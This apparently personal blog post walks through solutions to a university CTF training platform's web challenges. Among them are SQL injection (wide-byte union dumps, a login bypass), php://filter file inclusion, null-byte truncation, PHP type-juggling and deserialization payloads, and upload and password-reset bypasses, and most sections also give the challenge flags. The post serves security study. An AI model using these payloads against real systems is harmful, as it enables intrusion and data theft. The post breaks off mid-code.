<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>南京邮电大学网络攻防训练平台题解——WEB | Bonjour!</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="签到网页源代码：nctf{flag_admiaanaaaaaaaaaaa}
md5 collisionQNKCDZO的md5值为0e830400451993494058024219903391,所以显然根据在php中md5函数的判断规则，只要字符串的md5值开始也是0e则相等。http://115.28.150.176/md5/index.php?a=s878926199aflag：nctf{md">
<meta property="og:type" content="article">
<meta property="og:title" content="南京邮电大学网络攻防训练平台题解——WEB">
<meta property="og:url" content="http://yoursite.com/2016/10/13/南京邮电大学网络攻防训练平台题解——WEB/index.html">
<meta property="og:site_name" content="Bonjour!">
<meta property="og:description" content="签到网页源代码：nctf{flag_admiaanaaaaaaaaaaa}
md5 collisionQNKCDZO的md5值为0e830400451993494058024219903391,所以显然根据在php中md5函数的判断规则，只要字符串的md5值开始也是0e则相等。http://115.28.150.176/md5/index.php?a=s878926199aflag：nctf{md">
<meta property="og:updated_time" content="2016-10-13T09:17:34.271Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="南京邮电大学网络攻防训练平台题解——WEB">
<meta name="twitter:description" content="签到网页源代码：nctf{flag_admiaanaaaaaaaaaaa}
md5 collisionQNKCDZO的md5值为0e830400451993494058024219903391,所以显然根据在php中md5函数的判断规则，只要字符串的md5值开始也是0e则相等。http://115.28.150.176/md5/index.php?a=s878926199aflag：nctf{md">
  
    <link rel="alternate" href="/atom.xml" title="Bonjour!" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Bonjour!</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">正在输入...</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="Flux RSS"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Rechercher"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-南京邮电大学网络攻防训练平台题解——WEB" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/10/13/南京邮电大学网络攻防训练平台题解——WEB/" class="article-date">
  <time datetime="2016-10-13T09:08:16.000Z" itemprop="datePublished">2016-10-13</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF/">CTF</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      南京邮电大学网络攻防训练平台题解——WEB
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>网页源代码：<code>nctf{flag_admiaanaaaaaaaaaaa}</code></p>
<h3 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h3><p>QNKCDZO的md5值为0e830400451993494058024219903391,所以显然根据在php中md5函数的判断规则，只要字符串的md5值开始也是0e则相等。<code>http://115.28.150.176/md5/index.php?a=s878926199a</code><br>flag：<code>nctf{md5_collision_is_easy}</code></p>
<h3 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h3><p>用firebug查看到输入框中有maxlength=”10”，改大了之后再输入zhimakaimen即可。<br>flag：<code>nctf{follow_me_to_exploit}</code></p>
<h3 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h3><p>发现用bp截取不到数据包，用御剑也扫不出东西，于是把gif下载下来，用UE打开，发现最后藏了flag：<code>nctf{photo_can_also_hid3_msg}</code><br><a id="more"></a></p>
<h3 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h3><p>查看源代码，在最后有一个SO.html，点开发现S0.html，点开发现SO.htm，点开发现S0.htm，点开发现404.html，点开发现一段script的注释，里面藏着flag：<code>nctf{this_is_a_fl4g}</code></p>
<h3 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h3><p>在浏览器console中运行即可：<code>flag：nctf{javascript_aaencode}</code></p>
<h3 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h3><p>bp抓包发现<code>http://chinalover.sinaapp.com/web8/search_key.php</code>，查看内容就会发现其中存在flag。<br>key is : <code>nctf{yougotit_script_now}</code></p>
<h3 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h3><p>用bp的repeater，然后在请求中增加referer:www.google.com<br>flag:<code>nctf{http_referer}</code></p>
<h3 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h3><p>将php保存在本地环境运行。记得将eval改成echo即可。<br>flag:<code>nctf{gzip_base64_hhhhhh}</code></p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>使用filter的方式读取php的源代码<code>http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code><br>得到源码的Base64，解码得到：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">    &lt;title&gt;asdf&lt;/title&gt;</div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    error_reporting(<span class="number">0</span>);</div><div class="line">    <span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</div><div class="line">    $file=$_GET[<span class="string">'file'</span>];</div><div class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">include</span>($file);</div><div class="line"><span class="comment">//flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;</span></div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>于是可以看到flag：<code>nctf{edulcni_elif_lacol_si_siht}</code></p>
<h3 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h3><p>bp抓包发现在<code>http://chinalover.sinaapp.com/web9/index.php</code>中的Header头中存在flag。<br>flag: <code>nctf{this_is_302_redirect}</code></p>
<h3 id="Download"><a href="#Download" class="headerlink" title="Download~!"></a>Download~!</h3><p>查看源代码有这么两行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;p&gt;&lt;a href=&quot;download.php?url=eGluZ3hpbmdkaWFuZGVuZy5tcDM=&quot; target=&quot;_blank&quot;&gt;星星点灯&lt;/a&gt;&lt;/p&gt;</div><div class="line">&lt;p&gt;&lt;a href=&quot;download.php?url=YnV4aWFuZ3poYW5nZGEubXAz&quot; target=&quot;_blank&quot;&gt;不想长大&lt;/a&gt;&lt;/p&gt;</div></pre></td></tr></table></figure></p>
<p>于是可以用这个办法将download.php的源码down下来：<code>http://way.nuptzj.cn/web6/download.php?url=ZG93bmxvYWQucGhw</code><br>打开源码，发现：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">??<span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">include</span>(<span class="string">"hereiskey.php"</span>);</div><div class="line">$url=base64_decode($_GET[url]);</div><div class="line"><span class="keyword">if</span>( $url==<span class="string">"hereiskey.php"</span> || $url==<span class="string">"buxiangzhangda.mp3"</span> || $url==<span class="string">"xingxingdiandeng.mp3"</span> || $url==<span class="string">"download.php"</span>)&#123;</div><div class="line">    $file_size = filesize($url);</div><div class="line">    header ( <span class="string">"Pragma: public"</span> );</div><div class="line">    header ( <span class="string">"Cache-Control: must-revalidate, post-check=0, pre-check=0"</span> );</div><div class="line">    header ( <span class="string">"Cache-Control: private"</span>, <span class="keyword">false</span> );</div><div class="line">    header ( <span class="string">"Content-Transfer-Encoding: binary"</span> );</div><div class="line">    header ( <span class="string">"Content-Type:audio/mpeg MP3"</span>);</div><div class="line">    header ( <span class="string">"Content-Length: "</span> . $file_size);</div><div class="line">    header ( <span class="string">"Content-Disposition: attachment; filename="</span>.$url);</div><div class="line">    <span class="keyword">echo</span>(file_get_contents($url));</div><div class="line">    <span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Access Forbidden!"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>包含了一个hereiskey.php，用上面的办法继续down下源码，打开就可以看到key了：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">?<span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//flag:nctf&#123;download_any_file_666&#125;</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h3><p>bp改包，将cookie中的Login=0改成Login=1<br>flag：<code>nctf{cookie_is_different_from_session}</code></p>
<h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><p>题目提示robots.txt，那么就查看robots.txt：<code>http://chinalover.sinaapp.com/web11/robots.txt</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">别太开心，flag不在这，这个文件的用途你看完了？</div><div class="line">在CTF比赛中，这个文件往往存放着提示信息</div><div class="line"></div><div class="line">TIP:sql.php</div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_GET[id]) &#123;</div><div class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</div><div class="line">  mysql_select_db(SAE_MYSQL_DB);</div><div class="line">  $id = intval($_GET[id]);</div><div class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select content from ctf2 where id='$id'"</span>));</div><div class="line">  <span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span>($query[content]);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>关键在于intval函数，将string转换成int。那么就很好构造了：<code>http://chinalover.sinaapp.com/web11/sql.php?id=1024.01</code><br>the flag is:<code>nctf{query_in_mysql}</code></p>
<h3 id="sql-injection-3"><a href="#sql-injection-3" class="headerlink" title="sql injection 3"></a>sql injection 3</h3><p>证明存在宽字节注入：<code>http://115.28.150.176/sqli/index.php?id=%df&#39; 2%23</code><br>执行的sql语句：SELECT id,title FROM news WHERE id=’運’ 2#’<br>ErrorYou have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘2#’’ at line 1<br>判断列数：<code>http://115.28.150.176/sqli/index.php?id=%df&#39;order by 2%23</code><br>数据库：<code>http://115.28.150.176/sqli/index.php?id=%df&#39; union select database(),1 %23</code><br>执行的sql语句：SELECT id,title FROM news WHERE id=’運’ union select database(),1 #’<br>id: sqli1 title: 1<br>找表名：<code>http://115.28.150.176/sqli/index.php?id=%df&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23</code><br>执行的sql语句：SELECT id,title FROM news WHERE id=’運’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#’<br>id: 1 title: flag,news<br>找列名：<code>http://115.28.150.176/sqli/index.php?id=%df&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x666C6167 and table_schema=database()%23</code><br>执行的sql语句：SELECT id,title FROM news WHERE id=’運’ union select 1,group_concat(column_name) from information_schema.columns where table_name=0x666C6167 and table_schema=database()#’<br>id: 1 title: fl4g<br>找flag：<code>http://115.28.150.176/sqli/index.php?id=%df&#39; union select 1,fl4g from flag %23</code><br>执行的sql语句：SELECT id,title FROM news WHERE id=’運’ union select 1,fl4g from flag #’<br>id: 1 title: nctf{gbk_3sqli}<br>这道题也可以在知道flag表名之后直接：<code>http://115.28.150.176/sqli/index.php?id=%df&#39; union select *,1 from flag %23</code></p>
<h3 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h3><p>查看源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">view-source:</div><div class="line"></div><div class="line">    if (isset ($_GET[&apos;nctf&apos;])) &#123;</div><div class="line">        if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;nctf&apos;]) === FALSE)</div><div class="line">            echo &apos;必须输入数字才行&apos;;</div><div class="line">        else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE)   </div><div class="line">            die(&apos;Flag: &apos;.$flag);</div><div class="line">        else</div><div class="line">            echo &apos;骚年，继续努力吧啊~&apos;;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>根据题目提示使用00截断，可以构造nctf为1%00%23biubiubiu：<br><code>http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=1%00%23biubiubiu</code><br>可以获得Flag:<code>flag:nctf{use_00_to_jieduan}</code></p>
<h3 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h3><p>查看源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>])) &#123;</div><div class="line"><span class="keyword">if</span> ($_GET[<span class="string">'a'</span>] != $_GET[<span class="string">'b'</span>])</div><div class="line"><span class="keyword">if</span> (md5($_GET[<span class="string">'a'</span>]) === md5($_GET[<span class="string">'b'</span>]))</div><div class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="keyword">print</span> <span class="string">'Wrong.'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>很容易判断是PHP的弱类型：构造<code>http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=2</code>可以获得flag: <code>nctf{php_is_so_cool}</code></p>
<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>查看源代码里面有这么一段：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php if ($_SERVER["REQUEST_METHOD"] == "POST") &#123; ?&gt;</div><div class="line">    &lt;?php</div><div class="line">        extract($_POST);</div><div class="line">        if ($pass == $thepassword_123) &#123; ?&gt;</div><div class="line">        &lt;div class="alert alert-success"&gt;</div><div class="line">        &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">        &lt;?php &#125; ?&gt;</div><div class="line">    &lt;?php &#125; ?&gt;</div></pre></td></tr></table></figure></p>
<p>整理一下应该为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"> <span class="meta">&lt;?php</span></div><div class="line"> <span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>)</div><div class="line">    extract($_POST);</div><div class="line">    <span class="keyword">if</span> ($pass == $thepassword_123) &#123;</div><div class="line">        <span class="keyword">echo</span> $theflag;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>存在变量覆盖。<br>其中extract()函数的意思为：从数组中将变量导入到当前的符号表,该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">extract($_POST);</div><div class="line"><span class="comment">//相当于$username = $_POST['username'];</span></div><div class="line"><span class="comment">//$password = $_POST['password'];</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>构造POST请求为：<code>pass=1234&amp;thepassword_123=1234</code>即可得到flag：<code>nctf{bian_liang_fu_gai!}</code></p>
<h3 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言"></a>PHP是世界上最好的语言</h3><p>根据提示查看index.txt：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</div><div class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</div><div class="line">  <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"></div><div class="line">$_GET[id] = urldecode($_GET[id]);</div><div class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>提交到服务器的请求会做一次url编码，在源代码中做了一次解码，那么就再做一次url编码就可以了。<br>对hackerDJ做两次url编码即可：<code>http://way.nuptzj.cn/php/index.php?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61</code><br>flag：<code>nctf{php_is_best_language}</code></p>
<h3 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h3><p>改 X-Forwarded-For 为127.0.0.1<br>flag：<code>nctf{happy_http_headers}</code></p>
<h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>flag在返回包头里<br>Flag: <code>nctf{tips_often_hide_here}</code></p>
<h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p>上传一个jpg文件，用bp拦截请求，在uploads/之后加上1.php，然后再加上00截断即可。</p>
<h3 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h3><p>查看源码里面有这么一段：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$sql=<span class="string">"select user from ctf where (user='"</span>.$user.<span class="string">"') and (pw='"</span>.$pass.<span class="string">"')"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>.$sql;</div><div class="line">  $query = mysql_fetch_array(mysql_query($sql));</div><div class="line">  <span class="keyword">if</span>($query[user]==<span class="string">"admin"</span>) &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
<p>那么就构造POST请求为：<code>user=admin&#39;)%23&amp;pass=Password</code><br>flag:<code>nctf{ni_ye_hui_sql?}</code></p>
<h3 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h3><p>给了提示:strcmp(array,string)=null=0<br>那么就构造POST请求：<code>pass[]=1</code><br>flag:<code>nctf{strcmp_is_n0t_3afe}</code></p>
<h3 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h3><p>查看源码，number必须等于54975581388但是又不能是54975581388，那么可以转换成16进制数0xccccccccc<code>http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc</code><br>The flag is:<code>nctf{follow_your_dream}</code></p>
<h3 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h3><p>题目要求重置的是admin的密码，url显示的却是ctfuser<br>用bp查看请求，请求的url是/web13/index.php?user1=%59%33%52%6D%64%58%4E%6C%63%67%3D%3D<br>后面这串发现是ctfuser的base64的url编码。用bp的repeater功能，将url请求修改为admin的base64的url编码，POST请求为<code>user=admin&amp;newpass=1234&amp;vcode=1234</code><br>Response可以看到flag is:<code>nctf{reset_password_often_have_vuln}</code></p>
<h3 id="php-反序列化"><a href="#php-反序列化" class="headerlink" title="php 反序列化"></a>php 反序列化</h3><p>查看网页源代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</div><div class="line">    <span class="keyword">var</span> $enter;</div><div class="line">    <span class="keyword">var</span> $secret;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>])) &#123;</div><div class="line">    $pass = $_GET[<span class="string">'pass'</span>];</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</div><div class="line">        $pass=stripslashes($pass);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $o = unserialize($pass);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ($o) &#123;</div><div class="line">        $o-&gt;secret = <span class="string">"*"</span>;</div><div class="line">        <span class="keyword">if</span> ($o-&gt;secret === $o-&gt;enter)</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Congratulation! Here is my secret: "</span>.$o-&gt;secret;</div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="keyword">echo</span> <span class="string">"Oh no... You can't fool me"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"are you trolling?"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>源码的大概意思就是：o是对pass做了反序列化，然后如果<code>$o-&gt;secret === $o-&gt;enter</code>，那么就会出现flag。那么就构造<code>$o-&gt;secret = $o-&gt;enter</code>，得到序列化的字符串就可以了。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</div><div class="line"><span class="keyword">var</span> $enter;</div><div class="line"><span class="keyword">var</span> $secret;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$o = <span class="keyword">new</span> just4fun();</div><div class="line">$o-&gt;enter = &amp;$o-&gt;secret;</div><div class="line"><span class="keyword">echo</span> serialize($o);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>在本地的PHP环境下运行，或者是找个在线的PHP测试网站运行就可以获得序列化后的结果：<code>O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}``
http://115.28.150.176/php1/index.php?pass=O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}</code><br>提交之后就可以获得flag：Congratulation! Here is my secret: <code>nctf{serialize_and_unserialize}</code><br>这道题有个Writeup写的不错：<a href="http://115.159.210.46/archives/19.html" target="_blank" rel="external">http://115.159.210.46/archives/19.html</a><br>关键部分：<br>在 PHP 中普通的传值赋值行为有个例外就是碰到对象 object 时，在 PHP 5 中是以引用赋值的，除非明确使用了 clone 关键字来拷贝，PHP 支持引用赋值，使用“$var = &amp;$othervar;”语法。引用赋值意味着两个变量指向了同一个数据，没有拷贝任何东西。<br>简单来说，有这么一段代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">a = 1;</div><div class="line">b = &amp;a;</div><div class="line">a = a + 1;</div></pre></td></tr></table></figure></p>
<p>由于引用传参，a和b引用的是同一个数据，因此a+1后，b也会变成2。</p>
<h3 id="sql-injection-4"><a href="#sql-injection-4" class="headerlink" title="sql injection 4"></a>sql injection 4</h3><p>查看网页源代码可以发现：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</div><div class="line">        $str=stripslashes($str);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</div><div class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</div><div class="line"></div><div class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</div><div class="line">$result=mysql_query($query);</div><div class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'Invalid password!'</span>);</div><div 